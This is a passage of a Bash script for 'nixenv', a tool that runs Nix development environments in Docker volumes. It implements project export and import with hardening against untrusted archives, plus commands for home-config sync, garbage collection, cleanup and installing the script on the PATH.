      *) if [ -z "$name" ]; then name="$1"; else out="$1"; fi;;
    esac
    shift
  done
  [ -n "$name" ] || die "usage: $0 export <project> [archive.tar] [--with-home] [--force]"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  local pdir; pdir="$(project_dir "$name")"
  [ -d "$pdir" ] || die "unknown project '$name'"
  [ -n "$out" ] || out="$(export_archive_default "$name")"
  case "$out" in /*) ;; *) out="$PWD/$out";; esac

  # A live database's files are crash-consistent AT BEST. Refuse rather than
  # hand someone an archive that restores into a corrupt cluster.
  local cname; cname="$(container_name "$name")"
  if container_running "$cname"; then
    if [ "$force" != 1 ]; then
      die "'$name' is running — stop it first so the database files are consistent:
     $0 stop $name && $0 export $name
     (or --force to snapshot it live, crash-consistent at best)"
    fi
    warn "'$name' is RUNNING — this snapshot is crash-consistent at best"
  fi

  # The app volume is in EVERY archive, so a token embedded in .git/config leaks
  # even without --with-home. Refuse rather than scrub: the remote URL is the
  # user's data, and a token in it is a hazard well beyond nixenv.
  local leak; leak="$(app_git_embedded_creds "$name")"
  if [ -n "$leak" ]; then
    if [ "$force" != 1 ]; then
      die "the app volume's .git/config embeds credentials — the archive would leak them:
     $(printf '%s' "$leak" | sed 's#:[^/@]*@#:***@#')
     Fix the remote, then re-export (git's credential helper keeps working):
       $0 ssh $name
       git remote set-url origin https://<host>/<path>.git
     …or --force to archive them anyway."
    fi
    warn "--force: archiving .git/config WITH embedded credentials"
  fi

  local stage; stage="$(mktemp -d)"
  # shellcheck disable=SC2064
  trap "rm -rf '$stage'" EXIT
  mkdir -p "$stage/nixenv-export/meta" "$stage/nixenv-export/volumes"

  local f nmeta=0
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    mkdir -p "$stage/nixenv-export/meta/$(dirname "$f")"
    cp -p "$pdir/$f" "$stage/nixenv-export/meta/$f"
    nmeta=$((nmeta + 1))
  done <<EOF
$(export_project_files "$pdir" "$with_home")
EOF

  # The home volume holds ~/.ssh and ~/.git-credentials, so it is OPT-IN: the
  # default archive is safe to hand to a colleague. `import` reseeds a fresh home
  # from the skeleton, which is what most of that volume is anyway.
  local vols="app databases"
  [ "$with_home" = 1 ] && vols="app home databases"

  local v vol
  for v in $vols; do
    case "$v" in
      app)       vol="$(app_volume "$name")";;
      home)      vol="$(home_volume "$name")";;
      databases) vol="$(db_volume "$name")";;
    esac
    if ! vol_exists "$vol"; then
      warn "volume '$vol' does not exist — skipping"
      continue
    fi
    log "Archiving $vol"
    # -v lists each file on STDOUT (the archive goes to a mounted file), which is
    # what feeds the progress line. stderr stays visible: "file changed as we read
    # it" on a --force export is exactly what you want to see.
    "$ENGINE" run --rm -v "$vol":/src:ro -v "$stage/nixenv-export/volumes":/out \
      "$(img "$RUNTIME_IMAGE")" tar -C /src -cvzf "/out/$v.tar.gz" . \
      | progress_count "archiving $v" \
      || die "failed to archive $vol"
    echo "   $v.tar.gz  $(human_size "$stage/nixenv-export/volumes/$v.tar.gz")"
  done

  {
    echo "nixenv-export=1"
    echo "version=$NIXENV_VERSION"
    echo "project=$name"
    echo "created=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "app_mount=$(project_app_mount "$name")"
    echo "source_uid=$(id -u)"
    echo "engine=$ENGINE"
    echo "home=$with_home"
  } > "$stage/nixenv-export/manifest"

  log "Writing $out"
  ( cd "$stage" && tar -cf "$out" nixenv-export ) || die "failed to write $out"
  rm -rf "$stage"; trap - EXIT

  ok "Exported '$name' → $out"
  echo "   size:   $(human_size "$out")"
  echo "   holds:  $(printf '%s' "$vols" | tr ' ' '+') volumes, and $nmeta files from $pdir"
  echo "   import: $0 import $out [new-name]"
  if [ "$with_home" = 1 ]; then
    warn "--with-home: this archive contains ~/.ssh and git credentials (volume + seed) — treat it as a SECRET"
  else
    echo "   home:   NOT included (no ssh keys or git credentials)."
    echo "           import reseeds dotfiles and asks for a git identity."
    echo "           Shell history, nvim plugins and ~/.local/bin are not kept —"
    echo "           add --with-home if you want them."
  fi
}

# Is this port spec safe to take from someone else? Bare numbers and specs that
# bind loopback only. Anything else could publish a service on your LAN.
safe_port_spec() {
  case "$1" in
    *[!0-9.:]*) return 1;;
    *:*:*:*) return 1;;
    127.0.0.1:[0-9]*:[0-9]*) return 0;;
    *:*:*) return 1;;                      # any other bind address
    [0-9]*:[0-9]*) return 0;;              # host:container — cmd_run publishes as given…
    [0-9]*) return 0;;
  esac
  return 1
}

# Ask a yes/no question on the terminal. Returns 1 (no) when there's no TTY —
# a non-interactive import must never grant something by default.
confirm_tty() {
  [ -t 0 ] || return 1
  printf '%s [y/N] ' "$1"
  local ans=""; read -r ans || true
  case "$ans" in [yY]|[yY][eE][sS]) return 0;; esac
  return 1
}

# Bring an archive's project files in WITHOUT trusting them. They decide how
# the container is CREATED on this host, and the archive may be someone else's:
#   * regular files with plain relative paths only — a symlinked meta file
#     (hosts.extra -> ~/.ssh/id_…) would get bind-mounted into the container.
#     Content is copied with `cat` into a fresh file, so no link or mode survives;
#   * files regenerated here (EXPORT_SKIP_PATHS) are ignored even if present;
#   * extra-parameters, deploy_ssh_config, deploy_gitconfig, deploy_known_hosts,
#     ssh/authorized_keys.extra → shown and applied only after an interactive
#     yes (import_gated); otherwise parked as <file>.imported;
#   * ports             → loopback-only specs kept, anything binding another
#                         address dropped (bare host:container → 127.0.0.1:…);
#   * unrestricted      → honoured only after an interactive yes; --yes does
#                         NOT accept it, and without a TTY the project stays
#                         restricted;
#   * allowed_hosts / deploy_hosts / ssh_hosts → each entry re-validated;
#   * app_mount / flake_dir → validated like the commands that write them;
#   * home/.gitconfig.identity → rebuilt from name + email only;
#     home/.git-credentials → credential-store lines only, mode 600;
#     home/.gitconfig.credentials → rewritten by us (no foreign helper);
#   * anything else (accept-from, hosts.extra, the seed's dotfiles…) is copied;
#     accept-from is re-validated where it is used (project_accept_from).
import_meta_files() {
  local meta="$1" pdir="$2" name="$3" rel src dst line spec kept dropped gname gemail
  # Symlinks and other non-regular files never come in — a symlinked
  # hosts.extra -> ~/.ssh/id_… would be bind-mounted into the container.
  ( cd "$meta" && find . ! -type f ! -type d ) | sed 's#^\./##' | while IFS= read -r rel; do
    warn "archive meta/$rel is not a regular file (symlink?) — ignored"
  done
  while IFS= read -r rel; do
    [ -n "$rel" ] || continue
    # Paths become paths under <project>/: plain names only, no '..'.
    case "/$rel/" in
      */../*|*/./*|*[!a-zA-Z0-9._/@+-]*) warn "archive meta/$rel has an unsafe path — ignored"; continue;;
    esac
    path_in_list "$rel" "$EXPORT_SKIP_PATHS" && continue   # regenerated here
    src="$meta/$rel"; dst="$pdir/$rel"
    mkdir -p "$(dirname "$dst")"
    case "$rel" in
      extra-parameters)
        import_gated "$src" "$dst" "$name" "extra engine parameters (they change how the container is created and can grant root on the engine host)";;
      deploy_ssh_config|deploy_gitconfig)
        import_gated "$src" "$dst" "$name" "$rel (it runs inside the deploy container, which holds your ssh agent)";;
      deploy_known_hosts)
        import_gated "$src" "$dst" "$name" "deploy_known_hosts (pre-trusted server host keys for deploy)";;
      ssh/authorized_keys.extra)
        import_gated "$src" "$dst" "$name" "extra authorized ssh keys (they can log into the project container)";;
      ports)
        kept=""; dropped=""
        while IFS= read -r line || [ -n "$line" ]; do
          spec="$(printf '%s' "${line%%#*}" | tr -d '[:space:]')"
          [ -n "$spec" ] || continue
          if safe_port_spec "$spec"; then
            case "$spec" in [0-9]*:[0-9]*) case "$spec" in *:*:*) ;; *) spec="127.0.0.1:$spec";; esac;; esac
            kept="$kept$spec
"
          else
            dropped="$dropped $spec"
          fi
        done < "$src"
        if [ -n "$dropped" ]; then
          warn "dropped port specs that bind beyond loopback:$dropped"
          echo "    (re-add deliberately with '$0 expose $name <spec>' if you want them)"
        fi
        printf '%s' "$kept" > "$dst"; chmod 0644 "$dst";;
      unrestricted)
        warn "this archive turns egress restriction OFF for '$name'"
        if confirm_tty "Import '$name' UNRESTRICTED (full network access)?"; then
          : > "$dst"
        else
          log "keeping '$name' restricted (lift it later with '$0 restrict $name off')"
        fi;;
      allowed_hosts|deploy_hosts|ssh_hosts)
        : > "$dst"
        while IFS= read -r line || [ -n "$line" ]; do
          spec="$(printf '%s' "${line%%#*}" | tr -d '[:space:]')"
          [ -n "$spec" ] || continue
          if spec="$(normalize_allowed_host "$spec")"; then
            grep -qxF "$spec" "$dst" || printf '%s\n' "$spec" >> "$dst"
          else
            warn "dropped invalid $rel entry from the archive: $line"
          fi
        done < "$src"
        chmod 0644 "$dst"
        log "$rel from the archive: $(tr '\n' ' ' < "$dst")";;
      app_mount)
        spec="$(tr -d '[:space:]' < "$src")"
        if [ -n "$spec" ] && ! valid_app_mount "$spec"; then
          warn "ignoring the archive's app path — using /app"; continue
        fi
        printf '%s' "$spec" > "$dst";;
      flake_dir)
        spec="$(tr -d '[:space:]' < "$src")"
        case "$spec" in
          /*|*..*|*[!a-zA-Z0-9._/-]*) warn "ignoring the archive's flake dir '$spec'"; continue;;
        esac
        printf '%s' "$spec" > "$dst";;
      home/.gitconfig.identity)
        # Rebuilt from name + email only: the file is included by every git
        # config, deploy's too, and a crafted one could add a credential helper.
        gname="$(sed -n 's/^[[:space:]]*name[[:space:]]*=[[:space:]]*//p' "$src" | head -n 1)"
        gemail="$(sed -n 's/^[[:space:]]*email[[:space:]]*=[[:space:]]*//p' "$src" | head -n 1)"
        case "$gname$gemail" in
          *[\"\\\[\]\;#]*) warn "ignoring the archive's git identity (unexpected characters)"; continue;;
        esac
        [ -n "$gname$gemail" ] || continue
        printf '[user]\n\tname = %s\n\temail = %s\n' "$gname" "$gemail" > "$dst"
        ok "git identity from the archive → $gname <$gemail>";;
      home/.git-credentials)
        # Data only: keep credential-store lines, nothing else.
        grep -E '^https?://[^[:space:]]+@[^[:space:]/]+' "$src" > "$dst" || : > "$dst"
        chmod 600 "$dst";;
      home/.gitconfig.credentials)
        # Ours to write, never theirs: a helper here would run on every fetch.
        printf '[credential]\n\thelper = store\n' > "$dst";;
      home/.ssh/*)
        cat "$src" > "$dst"; chmod 700 "$(dirname "$dst")"; chmod 600 "$dst";;
      *)
        cat "$src" > "$dst"; chmod 0644 "$dst";;
    esac
  done <<EOF
$( cd "$meta" && find . -type f | sed 's#^\./##' | LC_ALL=C sort )
EOF
}

# Bring in a file that changes how a container is created, who can log in, or
# what runs next to your agent: shown, then applied only after an interactive
# yes (--yes does NOT grant it; no TTY = parked as <file>.imported).
# A comments-only file carries nothing and is copied as-is.
import_gated() {
  local src="$1" dst="$2" name="$3" what="$4"
  if [ -z "$(sed 's/#.*//' "$src" | tr -d '[:space:]')" ]; then
    cat "$src" > "$dst"; return 0
  fi
  warn "the archive carries $what:"
  sed 's/#.*//' "$src" | grep -v '^[[:space:]]*$' | head -n 20 | sed 's/^/      /'
  if confirm_tty "Apply it to '$name'?"; then
    cat "$src" > "$dst"
    ok "applied ${dst#"$PROJECTS_DIR/"}"
  else
    cat "$src" > "$dst.imported"
    echo "    NOT applied. Review $dst.imported, then: mv $dst.imported $dst"
  fi
}

cmd_import() {
  require_engine
  local arc="" newname="" force=0 assume_yes=0
  while [ "$#" -gt 0 ]; do
    case "$1" in
      --force) force=1;;
      --yes|-y) assume_yes=1;;
      -*) die "unknown option: $1";;
      *) if [ -z "$arc" ]; then arc="$1"; else newname="$1"; fi;;
    esac
    shift
  done
  [ -n "$arc" ] || die "usage: $0 import <archive.tar> [new-name] [--force] [--yes]"
  [ -f "$arc" ] || die "no such archive: $arc"

  local stage; stage="$(mktemp -d)"
  # shellcheck disable=SC2064
  trap "rm -rf '$stage'" EXIT
  # --no-same-owner: the archive's uids mean nothing here.
  tar -xf "$arc" -C "$stage" --no-same-owner 2>/dev/null \
    || die "could not extract $arc"
  local root="$stage/nixenv-export"
  [ -f "$root/manifest" ] || die "not a nixenv export (no manifest): $arc"
  [ "$(manifest_get "$root/manifest" nixenv-export)" = "1" ] \
    || die "not a nixenv export (bad manifest): $arc"

  local name; name="${newname:-$(manifest_get "$root/manifest" project)}"
  [ -n "$name" ] || die "manifest has no project name and none was given"
  # The name comes from an untrusted archive and becomes a path and a container
  # name, so validate it exactly as 'init' would.
  case "$name" in */*|.|..|"") die "invalid project name from archive: '$name'";; esac
  case "$name" in *[!a-zA-Z0-9._-]*) die "invalid project name: '$name'";; esac

  local pdir; pdir="$(project_dir "$name")"
  if [ -d "$pdir" ]; then
    # Say WHERE the name came from: "pick another name" reads as nonsense when
    # the user just passed one.
    local src_of_name="from the archive"
    [ -n "$newname" ] && src_of_name="the name you gave"
    if [ "$force" != 1 ]; then
      die "project '$name' already exists ($src_of_name). Either:
       $0 import $arc <a-different-name>
       $0 delete $name          # then re-import
       $0 import $arc $name --force   # OVERWRITES its volumes"
    fi
    # --force here is as destructive as `delete`: the restore wipes each volume
    # before untarring. `delete` confirms, so this must too.
    warn "'$name' already exists — --force will REPLACE its app/databases volumes"
    echo "    existing data in $(app_volume "$name") and $(db_volume "$name") is lost"
    echo "    (the home volume is $( [ -f "$root/volumes/home.tar.gz" ] && echo "replaced too" || echo "left alone"))"
    if [ "$assume_yes" != 1 ]; then
      printf 'Proceed? [y/N] '
      local ans=""; read -r ans || true
      case "$ans" in
        [yY]|[yY][eE][sS]) ;;
        *) warn "Aborted — nothing changed"; rm -rf "$stage"; trap - EXIT; return 0 ;;
      esac
    fi
  fi

  log "Importing '$name' (exported $(manifest_get "$root/manifest" created) by nixenv $(manifest_get "$root/manifest" version))"
  mkdir -p "$pdir/home"

  import_meta_files "$root/meta" "$pdir" "$name"

  # Machine-specific state is REGENERATED, never restored: passwd/group/shadow
  # from this uid, and a fresh free port (the exported one may be taken here).
  write_passwd_files "$pdir"
  local port; port="$(project_port "$name")"

  # An archive WITHOUT a home volume is the normal case — export omits it unless
  # --with-home, so the archive carries no ssh keys or git credentials. Build a
  # fresh home here instead: skeleton dotfiles plus a git identity. This must run
  # BEFORE ensure_volumes, which seeds the home volume from <project>/home — do
  # it after and the volume is seeded from an empty directory.
  # (if/fi, not `[ ] && var=1`: a false test returns 1 and trips set -e.)
  local has_home=0
  if [ -f "$root/volumes/home.tar.gz" ]; then
    has_home=1
  else
    log "No home volume in the archive — seeding a fresh one"
    seed_project_home "$pdir"   # no-clobber: the archive's seed files win
    [ -f "$pdir/home/.gitconfig.identity" ] || configure_git_identity "$pdir"
  fi
  ensure_volumes "$name"

  local v vol
  for v in app home databases; do
    [ -f "$root/volumes/$v.tar.gz" ] || continue
    case "$v" in
      app)       vol="$(app_volume "$name")";;
      home)      vol="$(home_volume "$name")";;
      databases) vol="$(db_volume "$name")";;
    esac
    log "Restoring $vol"
    # -u 0 then chown: the archive's files carry the EXPORTING machine's uid, and
    # ensure_volumes only chowns when the root isn't already ours — so without
    # this an import across machines leaves every file unwritable.
    "$ENGINE" run --rm -u 0 -v "$vol":/dst -v "$root/volumes":/in:ro \
      "$(img "$RUNTIME_IMAGE")" \
      sh -c 'set -e; rm -rf /dst/* /dst/.[!.]* /dst/..?* 2>/dev/null || true
             tar -C /dst -xvzf "/in/'"$v"'.tar.gz"
             chown -R '"$(id -u):$(id -g)"' /dst' \
      | progress_count "restoring $v" \
      || die "failed to restore $vol"
  done

  # Defence in depth for archives made before export learned to refuse these.
  local leak; leak="$(app_git_embedded_creds "$name")"
  if [ -n "$leak" ]; then
    warn "the imported .git/config embedded credentials — removing them"
    app_scrub_git_creds "$name"
  fi

  # A fresh home has no ~/.git-credentials, so an https remote would prompt on
  # every fetch. The clone URL is only knowable once the app volume is restored,
  # which is after ensure_volumes seeded the home volume — hence sync_home_files.
  if [ "$has_home" != 1 ]; then
    local origin; origin="$(app_git_remote "$name")"
    case "$origin" in
      http://*|https://*)
        log "Project clones over HTTPS — credentials are needed to fetch/push"
        configure_git_credentials "$pdir" "$origin"
        sync_home_files "$name" .git-credentials .gitconfig.credentials .gitconfig
        ;;
    esac
  fi

  write_extra_parameters "$name"
  write_host_ssh_config "$name"
  rm -rf "$stage"; trap - EXIT

  ok "Imported as '$name'"
  echo "   ssh:    host port $port  (freshly assigned — the exported one is not reused)"
  echo "   repo → $(project_app_mount "$name")"
  if is_restricted "$name"; then
    echo "   egress→ RESTRICTED (allowed: $(tr '\n' ' ' < "$pdir/allowed_hosts" 2>/dev/null))"
  fi
  if [ "$has_home" != 1 ]; then
    echo
    warn "the home volume was not in the archive — a fresh one was created"
    echo "   git identity: written to $pdir/home/.gitconfig.identity"
    echo "   ssh keys:     none. For git-over-ssh, add a key inside the project:"
    echo "                 $0 ssh $name   then   ssh-keygen -t ed25519"
    echo "   https auth:   asked for above when the remote is https; otherwise"
    echo "                 re-run '$0 init $name <https-clone-url>' to store a token."
  fi
  echo
  log "next: $0 build            # once per machine, if the shared store is missing"
  log "      $0 build $name      # the project's own flake"
  log "      $0 run $name"
}

# =============================================================================
#        (e.g. .nixenv/home/.config/nvim/init.lua), which win over the skeleton.
#   Any file it overwrites is backed up in the volume at
#   ~/.nixenv/home-backups/<timestamp> first. Also refreshes the host seed so a
#   future from-empty re-seed carries the same skeleton.
# =============================================================================
cmd_sync_home() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 sync-home <project>"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  resolve_engine

  local pdir homev appv
  pdir="$(project_dir "$name")"; homev="$(home_volume "$name")"; appv="$(app_volume "$name")"
  [ -d "$pdir" ]      || die "unknown project '$name' — run '$0 init $name' first"
  [ -d "$HOME_SKEL" ] || die "no home skeleton at $HOME_SKEL"

  # 1. Refresh the HOST seed (overwrite managed dotfiles; git identity/creds are
  #    NOT part of the skeleton, so they're left alone).
  cp -R "$HOME_SKEL/." "$pdir/home/" 2>/dev/null || true
  chmod 700 "$pdir/home/.ssh" 2>/dev/null || true
  find "$pdir/home/.ssh" -type f -exec chmod 600 {} \; 2>/dev/null || true

  log "This refreshes '$name' home config, layering:"
  echo "   1. embedded skeleton:"
  ( cd "$HOME_SKEL" && find . -type f | sed 's#^\./#        ~/#' | sort )
  echo "   2. per-project overrides from <repo>/.nixenv/home/  (if present, win over 1)"
  warn "Matching files in the home volume will be OVERWRITTEN (backed up first)."
  warn "Installed nvim plugins, shell history, and git credentials are untouched."
  printf 'Proceed? [y/N] '
  local ans=""; read -r ans || true
  case "$ans" in [yY]|[yY][eE][sS]) ;; *) warn "Aborted — nothing changed"; return 0 ;; esac

  ensure_volumes "$name"   # create + seed if the volume is new/empty

  # 2. Layer skeleton then repo overrides into the volume via a ROOT helper:
  #    back up each file we're about to overwrite (original version, once), copy
  #    each source in order, then chown the written paths (and backup) to our uid.
  #    The app volume is mounted read-only so /app/.nixenv/home/ can override.
  local uid gid ts; uid="$(id -u)"; gid="$(id -g)"; ts="$(date +%Y%m%d-%H%M%S)"
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__synchome-$name" >/dev/null 2>&1 || true
  "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__synchome-$name" -u 0 \
    -v "$homev":/home -v "$HOME_SKEL":/seed:ro -v "$appv":/app:ro \
    -e NIXUID="$uid" -e NIXGID="$gid" -e TS="$ts" \
    "$(img "$RUNTIME_IMAGE")" sh -c '
      set -e
      bk="/home/.nixenv/home-backups/$TS"
      for src in /seed /app/.nixenv/home; do
        [ -d "$src" ] || continue
        ( cd "$src" && find . -type f ) | while IFS= read -r f; do
          rel=${f#./}
          # Back up the ORIGINAL file once (skip if an earlier layer already did).
          if [ -e "/home/$rel" ] && [ ! -e "$bk/$rel" ]; then
            mkdir -p "$bk/$(dirname "$rel")"
            cp -a "/home/$rel" "$bk/$rel" 2>/dev/null || true
          fi
        done
        cp -a "$src"/. /home/
        find "$src" -mindepth 1 | while IFS= read -r f; do
          rel=${f#"$src"/}
          chown "$NIXUID:$NIXGID" "/home/$rel" 2>/dev/null || true
        done
      done
      [ -d "$bk" ] && chown -R "$NIXUID:$NIXGID" /home/.nixenv 2>/dev/null || true
      :
    ' >/dev/null 2>&1 || die "home sync helper failed for '$name'"

  ok "Home config refreshed for '$name'"
  echo "   backup of overwritten files → ~/.nixenv/home-backups/$ts  (in the home volume)"
  echo "   open a new shell / relaunch 'nvim' to pick up the changes"
}

# =============================================================================
# logs — follow the service container logs (sshd / runit output)
# =============================================================================
cmd_logs() {
  require_engine
  local name="${1:-}"; [ -n "$name" ] || die "usage: $0 logs <project>"
  exec "$ENGINE" logs -f "$(container_name "$name")"
}

# =============================================================================
# update — refresh flake.lock then rebuild into the volume
# =============================================================================
cmd_update() {
  require_engine
  [ -f "$FLAKE_DIR/flake.nix" ] || die "no flake.nix in $FLAKE_DIR"
  log "Updating flake.lock in $FLAKE_DIR"
  ensure_github_token
  "$ENGINE" rm -f "${CONTAINER_PREFIX}__update" >/dev/null 2>&1 || true
  run_builder base "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__update" \
    -v "$FLAKE_DIR":/flake -w /flake \
    -e NIX_CONFIG="$(nix_config)" \
    "$(img "$BUILDER_IMAGE")" nix flake update \
    || die "updating the shared toolchain's flake.lock failed"
  cmd_build
}

# =============================================================================
# status — show context + volume + profile state
# =============================================================================
cmd_status() {
  ok "Context materialised at $CONTEXT_DIR"
  require_engine
  if volume_exists; then
    ok "Volume '$NIX_VOLUME' exists"
    "$ENGINE" volume inspect "$NIX_VOLUME" --format '   mountpoint: {{.Mountpoint}}'
    echo "   store size: $(store_size)"
    if store_is_populated; then ok "Shared profile present at $PROFILE"; else warn "Shared profile not built yet"; fi

    # Per-project profiles (built by 'build <project>'). Listed with a health
    # check so a broken/collected one is obvious without digging in the store.
    local profs
    profs="$("$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$RUNTIME_IMAGE")" \
      sh -c 'ls -1 /nix/var/nix/profiles/ 2>/dev/null | grep "^proj-" | grep -v -- "-link$"' 2>/dev/null || true)"
    if [ -n "$profs" ]; then
      log "Project profiles:"
      local p n
      for p in $profs; do
        n="$("$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$RUNTIME_IMAGE")" \
          sh -c "ls -1 /nix/var/nix/profiles/$p/bin 2>/dev/null | wc -l" 2>/dev/null | tr -d ' ')"
        if [ "${n:-0}" -gt 0 ] 2>/dev/null; then
          printf '   ✓ %-24s %s binaries\n' "${p#proj-}" "$n"
        else
          printf '   ✗ %-24s empty — rebuild: %s build %s\n' "${p#proj-}" "$0" "${p#proj-}"
        fi
      done
    fi
  else
    warn "Volume '$NIX_VOLUME' does not exist (run '$0 build')"
  fi
}

# =============================================================================
# gc — garbage-collect the shared store: delete every path not reachable from a
#      live profile (the base + each proj-<name>), and drop old generations.
#      Reclaims the space left by packages you removed from a flake.
#   usage: gc [--dry-run]
# =============================================================================
cmd_gc() {
  require_engine
  volume_exists || die "volume '$NIX_VOLUME' does not exist (nothing to collect)"
  local dry=0
  case "${1:-}" in
    ""|--delete) ;;
    --dry-run|-n) dry=1;;
    *) die "usage: $0 gc [--dry-run]";;
  esac

  # Measure with the RUNTIME image, never the builder: the builder's userland
  # lives IN the store we're about to collect, so its du/tail can vanish
  # mid-run. debian carries its own /bin and is unaffected.
  local before; before="$(store_size)"
  log "Store size before: $before"

  # A RUNNING container executes binaries from the store paths it was started
  # with. If a rebuild has since moved its profile forward, those older paths are
  # unreachable — collecting them would break the running container.
  local running
  running="$("$ENGINE" ps --format '{{.Names}}' | grep "^${CONTAINER_PREFIX}-" || true)"
  if [ -n "$running" ] && [ "$dry" != 1 ]; then
    warn "these containers are running and may reference paths being collected:"
    printf '   %s\n' $running
    warn "stop them first ('$0 stop <project>') for a clean sweep, or restart them after"
    printf 'Continue anyway? [y/N] '
    local ans=""; read -r ans || true
    case "$ans" in [yY]|[yY][eE][sS]) ;; *) warn "Aborted"; return 0;; esac
  fi

  if [ "$dry" = 1 ]; then
    log "Dry run — nothing will be deleted"
    "$ENGINE" run --rm -v "$NIX_VOLUME":/nix \
      -e NIX_CONFIG="$(nix_config)" "$(img "$BUILDER_IMAGE")" \
      nix-collect-garbage --dry-run 2>&1 | tail -20   # piped on the HOST, safe
    return 0
  fi

  # Pin the builder's own toolchain first: the volume IS the builder image's
  # /nix, so without roots a collect deletes the very tools the next build needs.
  ensure_builder_usable
  protect_builder_toolchain

  # Optimise BEFORE collecting, while the builder's own tools are still present;
  # afterwards the shell may have lost binaries the GC removed. No pipes here
  # for the same reason (`| tail` would break once coreutils is collected).
  log "Hardlinking identical files"
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix \
    -e NIX_CONFIG="$(nix_config)" "$(img "$BUILDER_IMAGE")" \
    nix store optimise >/dev/null 2>&1 || warn "store optimise failed (continuing)"

  log "Collecting garbage (keeping the base + every proj-* profile)"
  "$ENGINE" run --rm -v "$NIX_VOLUME":/nix \
    -e NIX_CONFIG="$(nix_config)" "$(img "$BUILDER_IMAGE")" \
    nix-collect-garbage -d || warn "garbage collection reported errors"

  local after; after="$(store_size)"
  ok "Store size: $before → $after"

  # The GC can remove paths the BUILDER image itself was seeded with (they are
  # not GC roots). Verify the store can still build, and say plainly how to fix
  # it if not, rather than letting the next 'build' fail mysteriously.
  if ! "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$BUILDER_IMAGE")" \
        nix --version >/dev/null 2>&1; then
    warn "nix itself is no longer usable from the store volume"
    warn "run '$0 clean' then '$0 build' to recreate it"
  fi
  store_is_populated || warn "the shared profile is gone — run '$0 build'"
  [ -n "$running" ] && warn "restart running projects so they use the current store paths"
  return 0
}

# =============================================================================
# clean — remove the standalone volume (deletes the shared store)
# =============================================================================
cmd_clean() {
  require_engine
  volume_exists || { warn "Volume '$NIX_VOLUME' does not exist"; return 0; }
  read -r -p "Remove volume '$NIX_VOLUME' and all shared packages? [y/N] " ans
  case "$ans" in
    [yY]*) "$ENGINE" volume rm "$NIX_VOLUME" >/dev/null && ok "Removed volume '$NIX_VOLUME'";;
    *) warn "Aborted";;
  esac
}

# =============================================================================
# install / uninstall — put this self-contained script on the global PATH
# =============================================================================
cmd_install() {
  local dir name src dest
  dir="${INSTALL_DIR:-/usr/local/bin}"
  name="${INSTALL_NAME:-nixenv}"
  src="$SCRIPT_DIR/$(basename "${BASH_SOURCE[0]}")"
  dest="$dir/$name"

  [ -f "$src" ] || die "cannot locate this script at $src"

  # Running FROM a Homebrew prefix means brew already put us on PATH. Copying
  # ourselves elsewhere would leave a second, never-upgraded nixenv that shadows
  # (or is shadowed by) the managed one depending on PATH order.
  case "$SCRIPT_DIR" in
    /opt/homebrew/*|/usr/local/Cellar/*|/opt/homebrew/Cellar/*|/home/linuxbrew/*)
      die "installed via Homebrew — already on PATH; upgrade with 'brew upgrade $name'";;
  esac

  if [ -e "$dest" ] && [ "$src" -ef "$dest" ]; then
    ok "Already installed at $dest"
    return 0
  fi

  log "Installing $src → $dest"
  # Mode 0755 (a+rx): a script must be READABLE to run, so +x alone (which can
  # leave 0711) is not enough for other users.
  if mkdir -p "$dir" 2>/dev/null && [ -w "$dir" ]; then
    cp "$src" "$dest" && chmod 0755 "$dest"
  elif command -v sudo >/dev/null 2>&1; then
    warn "no write access to $dir — using sudo"
    sudo mkdir -p "$dir" && sudo cp "$src" "$dest" && sudo chmod 0755 "$dest"
  else
    die "cannot write to $dir and sudo not available (set INSTALL_DIR to a writable dir)"
  fi

  [ -r "$dest" ] && [ -x "$dest" ] || warn "installed but not readable+executable — run: chmod 0755 $dest"
  ok "Installed as '$name' in $dir"
  case ":$PATH:" in
    *":$dir:"*) ;;
    *) warn "$dir is not on your PATH — add: export PATH=\"$dir:\$PATH\"";;
  esac
  log "Now run: $name --help"
}

cmd_uninstall() {
  local dest="${INSTALL_DIR:-/usr/local/bin}/${INSTALL_NAME:-nixenv}"
  [ -e "$dest" ] || { warn "not installed at $dest"; return 0; }
  log "Removing $dest"
  if [ -w "$(dirname "$dest")" ]; then
    rm -f "$dest"
  elif command -v sudo >/dev/null 2>&1; then
    sudo rm -f "$dest"
  else
    die "cannot remove $dest (no write access, no sudo)"
  fi
  ok "Uninstalled $dest"
}

usage() {
  cat <<EOF
nixenv.sh $NIXENV_VERSION — self-contained shared Nix dev environment in a Docker volume

Usage: $0 <command> [args]

On every run the embedded context (flake.nix, Dockerfile, entrypoint, home
skeleton) is written to \$CONTEXT_DIR and the build runs from there.

Commands:
  build                     (Re)write context, then download all flake deps
                            into the volume '$NIX_VOLUME'
  build <project> [--dir=P] Build the project's OWN flake into a per-project
                            profile, layered on top of the base. Default reads
                            flake.nix from the repo root; --dir=P copies a whole
                            folder (flake.nix + local deps it references).
                            --dir is REMEMBERED per project, so later rebuilds
                            are just 'build <project>'; --dir= (empty) clears it
  init <project> [git-url] [--branch=<name>] [--template=<name|url|path>]
       [--build] [--unrestricted] [--allow=host,…] [--app-path=/path] [--yes] [--force]
                            Fails if <project> already exists (--force re-runs
                            the scaffold, keeping volumes and the SSH port).
                            Scaffold <project>/home + the <project>_app volume;
                            prompts for git name/email; clones git-url if given
                            (the forge domain is auto-added to allowed_hosts).
                            --branch=<name> clones that branch (or tag) instead
                            of the repository's default one.
                            --template=<t> installs a ready-to-run stack: ONE
                            file that becomes the project's flake.nix, declaring
                            the toolchain + a startup hook that installs the app
                            on first 'run'. Short names resolve against
                            TEMPLATE_BASE; URLs and local paths also work.
                            Official: wordpress, cloudflare. Mutually exclusive
                            with git-url; asks to confirm unless --yes.
                            Egress restriction is ON by default (see 'restrict');
                            --unrestricted opts this project out.
                            --allow=a.com,b.com pre-validates egress hosts (same
                            syntax as 'allow'; repeatable).
                            --build also builds the project's flake.
                            --app-path=/path mounts the code volume there instead
                            of /app (stored in <project>/app_mount)
  run <project>             Start the project as a background service (sshd under
                            runit); prints the SSH port  (alias: start)
  ssh <project>             SSH into the running service (auto-starts it)
